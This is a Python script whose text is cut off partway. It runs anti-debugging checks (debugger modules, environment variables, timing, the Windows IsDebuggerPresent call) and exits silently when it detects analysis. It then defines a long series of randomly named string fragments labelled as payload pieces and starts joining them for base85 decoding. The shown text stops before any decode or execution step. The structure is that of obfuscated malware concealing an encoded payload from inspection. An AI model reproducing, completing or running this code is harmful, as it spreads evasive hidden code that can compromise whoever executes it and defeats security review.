#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cejs6apVxovP02 = 'iqS#A`M}8o<|k5t!eZfStc86am@?r9AM&t8UwMl}vJzzL;b8_}0XlQzF^(t2U<AbV{3Tcfp`Pb&`'
_coh6HGPQGqbeLs = 'Xd2PdQf*mB?B5QcDae{?P-YMK}x3%vX1$wDN=RzHQ_jBrBoB<PfGOd_TjTaEwc-=zHmwv5$D{Y?5'
_cmjB8BM9yvEwfh = 'p4{NPr=O#DqR9dNk|10_YVky>I7(90V^m6x>_{7-Vo^BWPV&nLG;UrDk)(RJ^YO-#?|dP5=XiCvq'
_cbC4kOx43tY6yN = '~&W?r&i&)aEBT`tX*2w%s@;vnSeZ^A;7Cv2gHDVi_kyq*<HW`et5O#L%9S)nF?4+zwGkGaJ*CO!%'
_c_Qb8FK9CQmZ2K = 'iXkBHsm`&K_BNmlKy5Nc;0dxY~MU^xO=a@NL3kYV|1zrH@;qC3(J7mZvqWAWcR@>E%2zkvJAp$A)'
_ckEftVH9BkEOK2 = '$3udJVtx`p`G0h8plg8r&PA|^IUK>iV!3kAnjsie`f*2Np`)_v&lWty<OnPZ*(rxw8mQ^Yq#paRe'
_cqB4kkSPupd0YT = 'BDaVwJ=|w>KhOlM6ewrwl2O;?$}ZHQJ#8?KWGAEjYe#0qRXyG_j)_UZC~p7L0QZEFPsOkAV9dg1X'
_cdDoLqJMZ6FktX = 'bocSBD@5T8sNlU21z8lbu&abj8hDE5A2>$7OiGMJN-4%JzdT5;x+@{&mBV{zj>O@XwV#QyepC^v?'
_cpy8wTrKZdV89O = 'or2mWi_43G=HK+{4_z#-k5=*w(~lV+#DoTdlYL@pcWV@>)d(6FzXRUu8;EogZ5{NV>Dp1T@;Is3U'
_cktGnArFhcYU4b = 'td0G*%bkM}nuS`|vThq?#V+{L=k;{(%At>{tB}8NnhwTR<6e58BY-y1Gs$h-`CrT>FCX}3dm0)NE'
_ctO6dgzw6qVvG6 = '#cc^agQH~xI=Zs#qnMiZ_WECYgf3t!NvOpFF^663`|iPnCgi*=RW~Cz<a32>pnsSnj--+E;RH{^|'
_chECvae13x8kKo = '2xhZuG02NDuSx>DD~VY%h)082q$ZENy~@EB?l_5gH*U!egdl)xHNnBygEc8vS{3i0`{YdSHpfe8R'
_chH4lZQ0lnTtjF = 'rT|nscJ<aj^sXY?c<{uJI5w(q;-Is|uw())y%<ydzMn`2a&Aeg%wM*F-KAk)F7R0xkoG=YL^n`t&'
_cd6_61zLHZ8eek = ';H%+>_CDiNBc)Ir2HL8ZLdiN{cO2jnXlYn?Bk=xH)GvwFnQv$J_%n{x=~oz9_O)-D1gJxI0s6B;~'
_co237sdbVmzlPT = 'Jn=tC}Mh^2~V9WHo3kj~>QPOtL%RJqusCDZ%BRk?mkg+OEU*M>2LUewL>>JV9HQ~deSkj{_mdS4_'
_cgzRd5iEg3fm24 = '<W7~tAf;pT<b5DV`5pRuQ+%wH!vgl1G6;;Kw{&m59k0@^VR^vw1;0#wl&F$k-F7oi+$8#Xk~k@^Y'
_cujz4HqbnyTE6n = 'wbRMj1hd>e6*n;w+C-7ADC~NkJXHJ3VM3hr;x_OVtt&j0dup6bJgB^=)k#_KQAdQ>uK%}T&sIj%G'
_cr0rxLZYxrba7q = '57<E8E%f4Sxlr)|8bTMeAD;Xe|1Azfuq3l%A>^g%=(JnD~uspIsBK9oV=;w8|^Ho?1e*%5MWTBZ`'
_cvheCHKv8Q2KNa = 'V&q5po-Vx2eQ6vD&_=<V*IAK)y;)_emLy+;6T>{6&v2-FDP3HOv6*S~?|7=$>Dl;NE&(O93#uH3T'
_csPJpB67f4SAlz = '|!r}(8s<3DF-}Jdwyyk2U*tylSX`!j%rMwcit!@(0q_8JvVoCk}ys+;=?D<@2@Z&nE4P#2L&QSmG'
_cxyC550A1H9c52 = '>Bjk7fW$;lbd$A6_f6%l$jY*Zr=L-m>%AIqcuAc8jGSn0aW&YQYCFXenkXDK*XA(exk`6L#5l?x?'
_cusp8qBgj6OSNp = 'cAndS?R@Em~6q>B#NHT=9T$tLnH~PAAK5(B4cvl_&n&>T{xdkM|B!BMbyPO&IjZ)zcy(wer4#yi6'
_cwyhBA8O4zK9lp = 'v<_MOW+Rh0<&xJG+zGJeFE>Dp!FfJ2he%0!!6X`e>%<hS!~ufM`ueqA9;VEI&sbb61@#xSZ!D-N_'
_czaU8aiypPULO1 = 'l&aSDyDzk(3BNv%uOQG%*Jsyvr&KMKDXF5WT2zW!zUDC}}EXbZ<SpchWCAR(iWF3*)_z}&==#3R~'
_crW5pnRgJzA3Up = 'C4=(kFU`tnM2>SxRmD!5YQrX#Fmi{y2j6#SGdrl%3&-FYXGQ9**y5hIZOMq__oUzz3g}?a`E^*lg'
_crhRHynZpGBppW = 'K`<yW>2joz7o~OESAJNUbr~;0laU#kux(k`<BRqyva1uSC%~^>Bt!+*N*v{zkx8JsRn&d|f`ltHt'
_ckKsfT1qznHnZF = '1V$zw6-;&em-y9O@DBNa;AN?o}DPn&`XJGY@Zj;uZ{>kmX__9Zwyc2s>T|?VY2#=&;Z~&wueZL@$'
_cyLqJGo3iOt1wy = 'UL9C;!Fj0d0#igqGPY_mi__Vb1$2q+zAT+JOV~2m{xx#v768%AfbHhJc$`-GCe_*JZ{52Vni6Zn|'
_cy_BNmI9OS2CHZ = ')ncdP2b5ABw%1R8!<`97jzg)09oZ9`4vJDi@b+K84#?R6@hxg1k>f*%CZhV9Dw&>R_zk@fNDFe~i'
_cp8TgPo_2Aui9y = 'PkI*{Rw#4eMxBX%Xs-CFQ{fdnh&fv5svJY|{amcv>iHBdTS7}n<3oSFbdRplolw<~tGX*nqu}Su4'
_chvYOPQQhW4Tag = '!6aRyGFWp&e}wR>ers8-lWJ%)@Cl!9+y2SLF3X|My9gB;b=ey=xOr+2i@+i>vC_7KrGE2b+2~tIO'
_cnJ8JfjLKDBU33 = 'NW6HYXf635_xs<5Dxm??$XlB&``ptakKb&q4aFmEPrxw*j5K4(1oq7iAn?73gg~_%I`aQnLfs7@T'
_cj8hnSx_RvC4cJ = '?a$iV3k7oLHNGqwzaO_XCxyw>5<&*{p)jZAfTbr7YDj-ZKZwqpxbe0HJ5U0!O*UyHCziZX3M!lqc'
_cvKyxI1lyNZcn4 = 'QF^BnI&a&+oK{|OZ8S}VoTf?9r29=Ns$IZ#S6e6I0jD`Jq01jN}W^?gpA=mBvGk8b*S!~-ML9C&R'
_cqd1uXAB5WnQaQ = 'DdFk6sq1I@Iu1ZT;<CraEX(qefl4@0|`>eA15e!O;(gp2|lz{8BJZzEoHUh_h<D8ivhL>naH{%1o'
_cyIAqN72i9ICoF = 'DeyA(pua0%B%xk?b3<T;h&UxaVv8{VN$zULgoMOzKncG+EhzF>;|hEglRMoDaRTl63f!^gd)ZQNq'
_cmF5c33GgJd16K = 'Wzeaa_Ew6WJcJ_W8g9ac_By0qc`j9i9zTN0i^-q#`SM(&2Uf{VOmLy`ibV}W6|e?LeUu6!wdHkgM'
_coOb2GA7EvgYiu = 'qkr>XQaZ(K{Oy&lcvMI_W;4MT{i+5IFrsE&4nDr;Ur^-o+vBf>1C4^_UL+h~3OAFGrxdriH!3<o&'
_clJH6DNhPdgNKA = '|D?DtI;=cjBReB*&X%lf;-I9BzAop6W$&t&G%1le0~pE^NE76QT($b&C}-JY&L3o_~_Y`7!@J5nJ'
_co38bGmFo0v_rT = '#Wp5#r&CFmfIv8=Kgr|B$8l1`_x%C7<0ZsAYMpdP9JUZkpXwda7#E*SpQwt4>V_H?Q9&Na{!#ctU'
_cchSyxwh_Z0kpy = 'dLN?*MBCiwtC$w7>E}V^A9JBuP)qbpE@)}rI8LHClOf!#&UeXtkHO2uF#HJ<sEr_b7_VjHg(w(M?'
_cgUtu0421K6kwq = 'RH%WIp{xGm7Sf}ww#KcAh#!b{M*{j2k20N{?4Z(gZm&qoDJ#lvz(6Hi$#O#1W8K(V%zvMdn0N{ik'
_cjgY84zmFVpRc5 = '#F@*`$cNYEiUW?0FhLO#S%jk9sQ@muC_jzgYSMAk)MYwoPC<d2lQ1%AAJ9g8MkPpFO>N{xQ4Pao?'
_clFgSPiuv3tt5R = 'CDO{ljtNya8G#RIk>ZwGq*M_{4x7%ghvd>}cAjqlE#CJiNea#HQg+S*lA&^Le86@5rFib_$lo329'
_cbvnaEzJ466oqH = 'NhWq;%B>RlR2z!swlJpK#&yt>1hd+6n0lZb5>uJDwgdi>{(3~5I<_n#VxaUtNtfl?)*l^_^YLPvH'
_csM5mL2EdfC6g2 = '57&R#geh(B5#UAQL!pJi9b!%{DLaFTi|z&^sNj!`_FAeEFNc?;u}xC5qBAc!FKnT*as1#j8WmqC<'
_cc1V5c1TbDLRWJ = 'x0v{@zGjDA$et8A@aVuRMxij;6RN2jg^CEM>=zAB2N7-xT=g%zk|@FHCNZFdx#DoW-JQ1-NFg~1>'
_crpaZ9psthSCUu = '>Aw)yoP4ru}k;I-j9C;Kw{;Wj|fj)oF=YY`70ID)>)f+w<+|suwYfXg%Ar11QFJ-7L8bZ+s99-~;'
_cc7pVO1Chpwma8 = '@f<X(Cj6AJVtm5y<Fbj1=m<GOHgR{YIu?X{BS#5$V5g_~$|=N@frY>KO_R6K5DTlg13cYy1E@Qy1'
_cxVZKqBSMDfNSl = 'ossv`*+aX-3RjPcwZ*1b5d3jtiJ!w4$`?Y&=^iGqc3o^f}b>WSP*`P+=s3*A`9Py6A#k<|uepJ4;'
_ctEnAQxTXiXTCC = 'L7HtKq#x8siu94_8_S7&`x9h)krz914@{yp-wVCISfN-R;BPMLIi-rOzgidGV9d+p2lTQ#Bb$jQV'
_cmn5H3AIRRmUGb = 'r-V2d!g^u!Y)&4{$i^`v*nZ{&$=V$ODNc?)T2#mZtPsz#2R21(DwU}Oq#7kEa92$dXqn6CGWXk8='
_csqu91phNwjM02 = 'ZM;T@vXSAP)M9P9{=tuxy=VX|ReJfo$DRtHB@T6e9HB^#y5_zTLmW-thDJy;HkoK0H8hV6^86h9q'
_cyIg_5B1JSyaWN = 'H3YQDT$mcsFTH5%NeZqU&K%UY8wNru^ADBJDRVKbMd=8bn`Zq0Zf8e2OUgC_Jzqm8nJ2JiD2Acz*'
_c_6nj4jlQ9Ik8D = ';2^xHNM`KoQDT6Y3Ncksj#}`im_~~z!hDUaT4D9$(FFPsHo58rL@|1*!uJop>g><zqi4%3>>|!)H'
_cotrMbw6pbfWlT = '{y2x3&5cRM?T*At;&|SPm;_-^Wq_gBDS*P~bdc4PPzdSWf|MBJHyj<xa-3535p#Hd04R|xvKMH@<'
_cjInAq3WAXWXGi = 'OzRQZLXb5tME7i$LtGgB5NrlYJ@w@lr<CMYYk7&ptYRdp<N@IieuVeMo}@hi2S!+1fig=<#d5LqL'
_cvmIBLPuXCUJvK = 'd$e4X^c!`Qyd$UXMdlOU`izk0p!vgqx&EWZG^g#Gk3^7$N%1YMNVY;EJ%_VpF8n3e)5QC+urdyah'
_cjZUfs8Vz7WL94 = 'jabxTRXon>*yhNm#;u@y`>YxfDgzZLQX3;!(p%|WuCSapua6Kj{6xtqJ8!$p#r9?KGm#n5YeREKY'
_cunENKwehaDlin = 'PP>N}wopRwPkuQ~oj|P8uq2ea@4R-&!f0R490zZjcZAkAc$MH(r65~c_VmJp*r8Rj1j<HL0udCIk'
_ciICFUIdQ60CFy = '{PP}!jt(1jc20d2tlvzsWHco2k$fZ?q!RwqhqnFd8#HF+?ODi;9qa7UL9kO|&Ir4+%#V&V2CL&SA'
_cqI7k9DYcBKb0p = '0e6?J{)Q`u&060tC3+;%a4E)hFq(>wF%{ilqgHN*IYuv{3<qn{+E+W!Qs_&xt@Ut^)YoT5|hwbGq'
_coPAJGlq8XbkvO = '5W*6x2_%zLk`i=8$wbmvA!llt)Xm5QjHuXuB}m!Dj1}*WY`ax}HyjGtRwZNz$OBsF-DdK^W@Afp;'
_c_RG66dkmNsugH = '^QOO+^OnuJbkJB^mt@oAtFpxST<fDVp#bE-EYRRGClzluGLadzqsAqFXuH2UjQtg=!wfPdvj{n+A'
_caXKl3ceOdosZ3 = 'f=48_%ZEuFP)3yDyQUzue8HGT{jzl4FYnfkKB21~6tO-ype~le}x7vA?Ek9Z(%xRiK2Hq2eqFo(l'
_ck4QCiRq4ENnP6 = '8EoI&u`sK}_1Nf#?364_?S;w9hHN-`=0Hz?sCklsW%7y@Z{*(|%!2SSn+Y66rlZM_NzbCW`3Do5e'
_ceMfpWOVxt4OSv = 'OE>uXWfch|6>j4I8%_8tOf{PDXGAWo^sm((GydpF*;%zhow=rGt$dm-b#g$V(Dkjt-M5pRklTGY{'
_cnsXA30yCDg39m = 'pEbH^CWcz>A&CE{TEZ0UF_;ew?9y_MaseJg}m_!XuPpG#4aAGb`FUFZ}qr(?`8r2$ZO*=A?2}khP'
_cdS8GhtXvVKle8 = 'xe|AoftNWY5fmJ{3QYvcBE6p1mB4oW+ev>%-9S?fBezTq^awbj!Lg*kdCHtP9iD5H3gE(;ecw(-?'
_caJa_JTWuEVsF_ = '&Nb?RGr!3;ui`JIz3c)(c@z{@0e)r1W5|p9$d6+s@A|`Sg<7&FMv;e>A1kBxSos&QV66}6dc}wmB'
_cePEGcdTrqHmKm = '#&3QaUGJMbbw+l+mWAowm48i=0d`9HdER(4C1L!bFCW@fq2GPJ7L9@bM|T1t8VraTIcCB0ymZo6B'
_csY7B2k0G2a53m = 'X~aNcWt#|ioFhEb)qmpit9nUjg96R@53nKPwv}b4+>o(rQwb;8qe*2zG*>3ZQQH%)VB)js7ey#b%'
_ca7d_JpJ2Mivcd = 'e48Qn?^voD%6L*Vd-$Zf`}h=oF$wVbpvKV7qZtK?lVlr7Zqo^p^^#4k&cb-;V^;3MZDv&kz77Rz-'
_cxvVxlvAe_ilhb = 'J$2+6baNX0V9)Em^cr6zh$TVplxt@N__PY+hCf&)!pc#f01(ql(6tv4~83&Jt`Ucu3p4x!Rop*R+'
_cdXRaYDrrU2sHU = 'lE3Z1~evxml&5cY4F7RpzaQfYqR9zC>!`Xny6~lNuwoc2$EYiHIGhnE61O7VxkjHd3l_h^M8#yn|'
_ctzpaZUl6kI8gM = '-ZM51%HEo5=k)bk{naNDtTw@#TQke=0utUa9`hz6{aLk%h}z{PgbmKE&E5My@^b8edkvHb9Tgq*k'
_clc8KVsBti3pAR = ')balb|y6izkf-ZPr2mX!ym0PDxXuX=3x-C9w~vFnZqCDB|kAmD47r}MNN|0#;l^`G*FrpJ2J$$Tp'
_cnreZQuhbHeU7R = '-V-vW}fG8{}!@mgjHvs{l=Md#D&eEQRB{D#wEF&<8Sk^G%R{U4QE<1_R1Uc&J<tMsD`cCk^-+^#r'
_caKodmlsa9Ygfp = '`KRZX@_1lI+NEuO~RB!+9v7ON%~>Ydq(YR5`r$2Z?jB(feVD-sWHhq<^}yU+YMCK?Oq5Ykrfkz{G'
_ccwhFDhUVU1u8t = 'PfH7v{S9Pl#aYLN;75&xO(aOymAM*lYpBy4WsO+ZlD|MXRN*FzRw|t6t4nfpcG|=LRj~m#_boz0&'
_cppCanewuBZmye = '+dg0IUK#6Cx^V4e<*@HV*p)*sx~A#kMv<b0h<Mc@i@^uktSvI0{k{SXECvdXfgN`3#-@EV$H=1XL'
_cv_Fvz3I4HTkm1 = 'Bf5agx>5c`WKF&-hBwH7`eY7!E^G~#2=3j6<-?i;CEsjk1804s;@Qp<J5{cR>h+}Y2THY^<fMz-X'
_cfMp11mDjjMyaU = '(>k;b}eJm5d?Kk7CWj4N#i66dlz#1I!NZdrH1C^E+!Fd)i?XgjinNdxG=Tn)$U%ptFFa&biqeklw'
_ct1SLuPi8YTHHr = 'i~KTN!j%cCf|y5sY$qu2Ehq<UjxzqRV{50m;PX7!Q=I<*zqzStCEFCqv{lT!jB1IR2n<Rd~agDby'
_cuKbusP1KVvJ_g = 'NrH1aWp1F%ak?r%8(<D(U6rJZmRGz~l<Azlxu2uMWSAP23pd7kC=tWV10pQ`QHNdD7VATo1`2dp$'
_cleebl2tQHJqKy = '`Z#VS02@L-SO7_!3v>1diEI{_&gD1G9gtg$Eq(=ZG1ik|FpENlGCgrwfpM@J`0hSkhekvucmNLd+'
_cqEVs4eiAs8PVH = 'vbL2o%T!6S`P<wr|v!tTCwM+A{ty*p_r9^J%DJZ?=QNNv*OxZz}1JvR1a$m!?GR4V<G@Fj>l+zkW'
_cwlqJ25SbLsXXE = 'S^roqG}0{p3F!TV2AILL78w;ov~RH}yXY<``vDcIEMBK73|P5qcY-zI(C}qLneK$(LcR{UYYLmNm'
_ca3BzubRKZZfmX = 'Y)J7_$kgkg9(R$m6IUx>Jx$J_`rlS<4<k!pinaZlOr;FR>EBDS~MkG;$=+7WubhDg|~@Zl4qJP8p'
_cwe4Q_qr8RDKRO = 'XJ?d+rCK)ag6yHEyZaKs{yn7OFiTO>c0|MY8<H2RC2bDwJzSJ>Z*R;0>&qzjCG3b*QKYdBP1;B>y'
_cqTy8NrCPuE9rT = 'ZH56(-?_Q?e^(w>L~LN`2Qs*e+Z>+gZ!Mw0BqXa~Ummv}wRRB4e`%Q-?u?IasH9`4v6D+S?T3Slb'
_cjoNRvxQqHaxvj = 'kljN1&=%Js_I|WF*2P0c<Pd-T+NYG2#Y}u7HLnYg2Jv1OFy}ax*$H=i{KDGfRvc3brDA9&gI?SIP'
_cvkFI_1ftjGmSX = 'I!%I4E6$XnQ<4XzKT8!XdZf`Dz*>=isDc!+DtM5~cn9)EfbiuKpW2RKU^UTdV}8Z=oE^2|dBStY>'
_cqpKPxwZAHhJjh = '3KExJ!#pue=ZW*R#&=IlCvum7d$J_-AdQO)76egHUl)vDjps(YyJwAdv$3)~Evn7B45=7&I8OUbx'
_ciVssD9kiymLiS = 'ngA8xJhZT@B8X;}cG3V@8QvO2ZlOQIxSCNK^+?qcDL9HKOr=JCB8`vfS^vs1H@RX!@XFDQ5WAji6'
_cjCoEYQYhHKv6F = '8Ub?h1jHrOWYY_P6=FZqw#4PQPE_5V_{YJ54=eHU!p{+r&al+_x((sHzM@0?-a;P8JwrfvB>|C-V'
_chuuYome5LQvD0 = '6mu!hwVvJoTn3r<Yw?nIJ6?<iqfbV4cCzBNtd^@5k5)ea|P(}coKJ+<oW?xF++89RiBTfY7UFo34'
_coVdIfAID6Pmlq = ')M3B$G$%Slp5_CkMSDpoL~|{E0O26mNU*3_Z9@6wxj)>rpaDDlZ7>#;1^g^ufKm3G3Y2T*Tmb+%l'
_crc0mALmO4Jegd = 'T~HNG&`-2r3gN+ZB?S6Vq~>(7XP;}!Fg_%k$<^=W=W7A)z^5B!jmd&6|wJZkLlqM^cCn?J^<<$3c'
_cgBUPifpYwuRqB = '-S$Hzh41Ri#uU{CXAOo95`0+R()Y8@XUZ(bgza2zEJ;s>7Eu!d0_3OU*cD}opFkl6@Q!N;d?o2vl'
_ckj3xYIrbBXbYk = '5FPuu_PtBrOfti6egojJ2yMGl)h9{J3a88bI(U0uU%duiRm|t3PTlfj;Y#J@NB$N@H;iK_4Yrlqx'
_crnWHV_lTHyXDp = '*R-RfLDmH>7^q?4wnVs@^aVy>q7l_9&({w=6Oa)Xx+Vwyg@uWmLFI>c>8S-wf;{4vAv;T%H^wT|3'
_cbsY9Hn5507KT9 = '+|!2YC=#<ZT7w#IUzWSY1}&vpOLLt8Iqt_QQBkZUizYe{xXf$lDWQyyIIkFEwq0sGaRcK+tu@k~='
_cj7JVAFbjwYmFt = 'BGgPg1RkL*0tPfox^e1p3i!$C=E^7Fdnepi+f>etziDmK>)zE@;$M0CvJ<E7R3=2yn5BM`?77G(n'
_cbhhI10ionfv9j = ';@|_&Y&fP)`c9?~jVy8peh1lOSC(sr?&CAfh5JKC1H#r2r=kRc`Exx4qgAQy+IN7fYE{<H2KJsG!'
_czR06YIFOZqS1j = '=JD>o%w%qawvwj?lhUs%wB@b5&O6H`3rw>oU56!<hmwSWas*H2I#l_(lo<%W;s9zjU&lROhCeY+y'
_chCSnIkBBzkOIs = '_S#-)n@B%?pCXJ`aWt4>0#><hQF9KXIauS>AYrQrw}pt9tMRWtBiOhWV@cN=>+mral>X?ZZK)AIF'
_cgimkujWg1dfp0 = 'HHJ6y;hev?flUawR^@ZeTNbC^Bqj+`7L>ab-Nb4Ws=@t5M?5B|~OD<oCgktLfkt`-u+ol>FzhFs{'
_ciQ3sD6HBU372G = '+DvN4!P^TknvL>sxgnnFYPGZ!*RVZAldHNJpW{QilGk#FIT;R%SWm!^3mXVwn^xGlNz>&o+m?+t@'
_cjsvftqPTR06bl = '`%HG;Hx!@4R0Z1N68Da9wUjGTknC&FPzP%P^ucKeWll8w{{Fp7=THJ^qqG7f>p%F^v{X22QcdNp-'
_ck6P4VhfT136rO = 'y$gH~W<hW3OgB<nmd{ZVNkhoE;8(=yhR&0){7d<m!0PUsrwACnr0%4cpFhAp39M$T159h#X!ZxWS'
_cwQ5oFTY9tAcsv = '25WzA7fpE_JRn{PQX>#X!`OcmHiMO;BJbh%Qcsvgy6kyribCl5sV%T5D>1&2Qq`KuA`H;rb`@N+d'
_cg41NM1At2waba = 'B`FJKd9TJeh-VX{9=`H>^G6_maqNmu1NhGz7W$x$JgCY~R+uwXD4%j7=ahb`QYuE{gD0JlbSYmGg'
_cjTn7SPkMXV8kW = '2tvuA02cv_ZZsjfxUq*w-{DS=#}tzEfX^2_n1p8Je=nIB5EG9aR?2&Z~Bh2CjWf-zMj8w@}Ut)nb'
_ca43vnHE2ktdCX = 'G++)(6xPO5MwCM%3?x`Qw5&<}~-fia|ZJYCzeO$VBT-uPsPF?!_!~x|y05$fK--<nRoxvPKb%)$*'
_cqmqdB2sjcyo6R = ')RM*xL`FX&JtLxGz(ttCbfvizHp?n9E}G@RcYiVe7P_k%{=e>r3UA#JR`a7{_VqH7ZKDROe`}mm%'
_crcW2tUcM5_RzH = '67}eP!O|;=r%U$fGGBKdIK~(7Lcq`t|b;6Koj(PLiSe#Rphe30(~4j${VBI-!7w;4WuYEd$Rhlq0'
_cfGjtgcTrA4Hti = 'ZRJ^CF%#SBMEvxQ!(+*xkEQiZ+Rzkjut#t#c}d^!QCnzzLQAoS01_tAH-uXwJyw{nbZdCuG{5>aH'
_cv81T0hIHl1qBL = '7fy2;{{d}rkUfIm1)Ri?<CYqQe#D<zzNS#t$gqXu{wE2xIMv;-{?x1_!G>c#>G-Q+&dKSHvx1o1N'
_cqVctqeUCls4lu = 'd@&Yqe5{)VD<;qyTNpt`)>$Oim)_xAgkiwwQwyhu7O7tr&bG6`f6hNYLcQ7gZ-AVP8*GLJ?Kp96f'
_cnzroM1qkeCVAp = '#msRlzh9MD>si>e+SZjv+GR96YpqxWG=gDDWf?z-B8A1P&xHr9j%z9;>ln)F;vN8E0^M9xXq{AFd'
_cxzQzJhBqbN_JE = '8!HPEGK9*dn-$p2-H($S~l0}Q!Hs*yrF93C9|asxcos395ym<^}!}nA(Ru8G&2LYul`nVBb>Z>BF'
_cafbwnWxeUvKVF = '`F9f>$w=jj3V7|7y;bqe?&xaj<AWlS2#l8A^Y^;uY!xkKm_e-@#oTZK5m}@f9iyapu)l@-1R@h1Z'
_cf5kJXRTDpw9OO = 'vk#Q>d8EOiHI5%>#^a`gU5kRDk>Y0LZj!YMqnJsiDso7M-6R!i6)*NoY%$@`)_t?qyP1u_Xy=6lb'
_cyYnHdZC9wwrOi = 'Ofv-fQLi7f?q{D!kPz<wALc&*75<j??ibvsn9*anh4n$oAQ5|V3Xum<v<~;0-Uj7Y40*b!9)=Rj*'
_cy2HZZJ_eG4IOf = 'SfWDoCJ5yB|0dkA3It^)oyq{8`Xs%DIp!scj!@F^e8&y{o{ZUz+|e(oGy?{97smmNy*-f#*IAgms'
_cywb5MZNy6WMCQ = '!U4QH0&Yh?b?yDBxmP&iz|*VspY67g}MsF7I1RzM$*FMI@BilFAYZY7P~`kUR;W#&>p*4$6i?cdL'
_c_W2IiLtDxHZyg = 'di&%<v)4|Lb$GF3e?G`a>#*>E|kYU-WrcY<I;fn8$vJ2@fLZAUB`UCBxMGcM8_Q%-ioMqOH+ni}!'
_cvnjtaBywuXhpR = 'OpP2LG%7;#t3xj#skEFl@tnRXu(K3EKDIVG5*ea_yAI@l{W589^;q9gZ*d@R4UXl%d#Y<bg}um2A'
_ca4J9nfGwDfnkK = 'flN@@M4Hy64vy0p_7lOiFiuqz;$CFi<s);nw#GgbR#&FMBNKPSYfvfFKa709@8F%8X7f_8XX3*mS'
_cjCSp36NAMTMyJ = 'o_ZRTSxO6nE|>n$NbvCHsP@*<YxUc8X+{XxUa2ngUN0m<`+vkB%=uDA0IwIM>T%$a`ro;!OF+Ee7'
_cl8cUMuwo6sh4_ = 'B$E&*SS>426`?+snyNl-LMv^?=A19MH^meVILOty}$?cy^*&_!6@pt_(Ku}wB6E)_^JfNv)-&`&^'
_cawtVBqfVs6QkS = 'Smq6Fs(!0R)nV>Kv@_2Bj$6>d3#I5EWtBnmgX{R8bcEx-zGsq3e*HMgW`<Nd6FyBkXZ=LQnF`HWY'
_cp4W2N8RwRuJ2M = 'fO<J>O*x8&|10_OsR^*h8n%sSV)k-YVH;K;;|+R66lh$mP>)@UuaR|7PX-ZTkYGUr5{BGK+ehaZb'
_coNku8dC9Ez2__ = 'e%@QHl#<0_a>R>2<`YAJe=YNn$Qt(+Kbbu1YtpRMF$G99p;KsCz0D6iW^mfT|C2%Bco=Pg1i<KXq'
_clAwBxbXFwuzTB = '$+v+j{${l(+^aGCeS2A`+zb5M|I|Jl&+`626KLGG3&5d9j3KJT&%Gxu{YLUJ>_=<ueKtUq#p)5+*'
_cqpfGYUCtXI81z = 'u?CpbZJ>gVQRCsvA3IQYeHMTsuII~)?1Wwkf)7(T&5?A4<C(U6z_%4++l&5o(=qdg3oRkej`PkOP'
_cpNmBj3EmtsWex = '$5WHj7Pz;N}{Fl}n)|CV4%g!FFTGvz#nqiJII{54cgW6=fw7!wJto9c5(lJcL19QX}w(S2syqrXT'
_czbHdmGAc9cesW = 'LENh}R?_J?`0!J}%c*Urd$&7OK@u*%VC#bQH1-am{-x}o4iI|1&!YX%}b_C&Z0lT^Y!3g_In>eg-'
_ccWZ5uzNdy8pxZ = 'W#q&J-CjKB&t|+8Iy~hi*a|Jsx0qL9q4EjHqs>PexDXolYJ;0$13obx7|8`0&67M5I>QDCdG=H+Z'
_csaZyIyXTHaJwr = 'cy{D(Q!C8X!>CkJ%ZxLXYP6}1?2LN280`P35t-e5j+Vy%Lm5fyc^j(t3q>r{q^{A~iA=ZCh$TCqq'
_csByVWMUqqtdk5 = '$0B}ppn(U?|_u&1$3PlKHgFY&n)syFON|hFgF98s%<*TijWWp@as>wy}z6vw%#D#3<Vbh+Jc)*c)'
_ccef4fbZ96TX_H = 'l)YYmP_2K;X#`n`TY#Bib%t@}ksX9C2<oN~j`;9TL=8u%~obctLp5kL64|AyNAr2G1u*aqRO5P~C'
_clzoAZBa9PO1Vw = 'F+GES()a|w8b#$uzj`_t+gTxL_3_XZk*c808wP!G!(>@*86<#MjN-R81Pw*CUc{c5<*R{eQ+5OY)'
_cfLJl59yVUWN9R = 'Bhn*^(cera<z4GL4(v^W=o6`DdZ1SJqzX2C2Q~}NQ`sJ{|c@ehR9uWZ`Z{EbynDKG;Qi6??cY6z%'
_cz9ZfZpIPojMnd = 'WG;SNJ9lmFy{;lb6Bi`Ugx$j71|E)zlz<i*g`M<Tt!RgX2L3E|qr+)zxs=K5DkosDM4$r0gSU@5J'
_chvr9MhAp5nHvz = 'dZ9eW~<B6=KN1g'

_pvQqsyoH6mlreu = __import__('base64').b85decode(_cejs6apVxovP02 + _coh6HGPQGqbeLs + _cmjB8BM9yvEwfh + _cbC4kOx43tY6yN + _c_Qb8FK9CQmZ2K + _ckEftVH9BkEOK2 + _cqB4kkSPupd0YT + _cdDoLqJMZ6FktX + _cpy8wTrKZdV89O + _cktGnArFhcYU4b + _ctO6dgzw6qVvG6 + _chECvae13x8kKo + _chH4lZQ0lnTtjF + _cd6_61zLHZ8eek + _co237sdbVmzlPT + _cgzRd5iEg3fm24 + _cujz4HqbnyTE6n + _cr0rxLZYxrba7q + _cvheCHKv8Q2KNa + _csPJpB67f4SAlz + _cxyC550A1H9c52 + _cusp8qBgj6OSNp + _cwyhBA8O4zK9lp + _czaU8aiypPULO1 + _crW5pnRgJzA3Up + _crhRHynZpGBppW + _ckKsfT1qznHnZF + _cyLqJGo3iOt1wy + _cy_BNmI9OS2CHZ + _cp8TgPo_2Aui9y + _chvYOPQQhW4Tag + _cnJ8JfjLKDBU33 + _cj8hnSx_RvC4cJ + _cvKyxI1lyNZcn4 + 